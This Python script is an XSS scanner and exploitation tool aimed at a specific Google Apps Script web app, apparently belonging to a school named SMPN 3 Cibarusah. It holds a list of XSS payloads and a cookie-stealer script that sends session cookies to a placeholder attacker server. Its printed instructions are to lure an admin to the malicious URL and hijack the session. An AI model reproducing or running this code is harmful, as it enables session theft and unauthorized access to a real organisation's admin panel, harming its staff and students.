#!/usr/bin/env python3
"""
Advanced XSS Scanner for Google Apps Script
Automated XSS detection and exploitation
"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

BASE_URL = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"

# XSS Payloads (progressively complex)
XSS_PAYLOADS = [
    # Basic alert
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    
    # Encoded
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert&#40;1&#41;>',
    
    # Event handlers
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    
    # JavaScript protocol
    '<a href="javascript:alert(1)">click</a>',
    '<form action="javascript:alert(1)"><input type=submit>',
    
    # Template injection
    '{{alert(1)}}',
    '${alert(1)}',
    
    # Context breaking
    '"><script>alert(1)</script>',
    '\';alert(1);//',
    '</script><script>alert(1)</script>',
    
    # Bypass filters
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img/src=x/onerror=alert(1)>',
    '<svg/onload=alert(1)>',
]

# Cookie stealer payload (after XSS confirmed)
COOKIE_STEALER = '''<script>
fetch('https://YOUR-SERVER.com/steal?c='+document.cookie+'&u='+encodeURIComponent(window.location.href)+'&r='+encodeURIComponent(document.referrer));
</script>'''

PAGES = ['admin', 'search', 'talk', 'walas', 'data', 'dashboard']
PARAMS = ['query', 'id', 'name', 'message', 'search', 'q', 'text', 'content']

def test_xss(url, param, payload):
    """Test single XSS payload"""
    try:
        # Test GET
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        response = requests.get(test_url, timeout=10, allow_redirects=True)
        
        # Check if payload reflected
        if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text:
            # Payload might be executed (not encoded)
            if '<script>' in payload.lower() and '<script>' in response.text.lower():
                return {'url': test_url, 'param': param, 'payload': payload, 'method': 'GET', 'confirmed': True}
            elif 'onerror=' in payload.lower() and 'onerror=' in response.text.lower():
                return {'url': test_url, 'param': param, 'payload': payload, 'method': 'GET', 'confirmed': True}
        
        # Test POST
        response = requests.post(url, data={param: payload}, timeout=10)
        if payload in response.text:
            if '<script>' in payload.lower() and '<script>' in response.text.lower():
                return {'url': url, 'param': param, 'payload': payload, 'method': 'POST', 'confirmed': True}
        
        return None
        
    except Exception as e:
        return None

def scan_endpoint(page):
    """Scan all params on a page"""
    url = f"{BASE_URL}?page={page}"
    results = []
    
    print(f"\n[*] Scanning page: {page}")
    
    for param in PARAMS:
        for payload in XSS_PAYLOADS:
            result = test_xss(url, param, payload)
            if result:
                results.append(result)
                print(f"[+] XSS FOUND! Page: {page}, Param: {param}")
                print(f"    Payload: {payload}")
                print(f"    Method: {result['method']}")
                # Don't test more payloads once one works
                break
    
    return results

def main():
    print("""
╔═══════════════════════════════════════════════════╗
║   Advanced XSS Scanner - Google Apps Script      ║
║   Target: SMPN 3 Cibarusah                       ║
╚═══════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Testing {len(PAGES)} pages")
    print(f"[*] Testing {len(PARAMS)} parameters")
    print(f"[*] Using {len(XSS_PAYLOADS)} payloads")
    print()
    
    all_results = []
    
    # Scan all pages
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(scan_endpoint, page) for page in PAGES]
        for future in futures:
            results = future.result()
            if results:
                all_results.extend(results)
    
    # Summary
    print("\n" + "="*60)
    print("SCAN COMPLETE")
    print("="*60)
    
    if all_results:
        print(f"\n[+] Found {len(all_results)} XSS vulnerabilities!\n")
        
        for i, vuln in enumerate(all_results, 1):
            print(f"{i}. Page: ?page={vuln['url'].split('page=')[1].split('&')[0]}")
            print(f"   Parameter: {vuln['param']}")
            print(f"   Method: {vuln['method']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   URL: {vuln['url']}\n")
        
        print("\n[*] Next step: Deploy cookie stealer")
        print("[*] Replace payload with:")
        print(COOKIE_STEALER)
        print("\n[*] Setup receiver at: https://YOUR-SERVER.com/steal.php")
        print("[*] Get admin to visit the malicious URL")
        print("[*] Steal session cookie → Hijack session → Access admin panel")
        
    else:
        print("\n[!] No XSS vulnerabilities found")
        print("[*] Try:")
        print("    - Manual testing with Burp Suite")
        print("    - DOM-based XSS analysis")
        print("    - Stored XSS via form submissions")
        print("    - Alternative attack methods (CSRF, etc)")

if __name__ == "__main__":
    main()
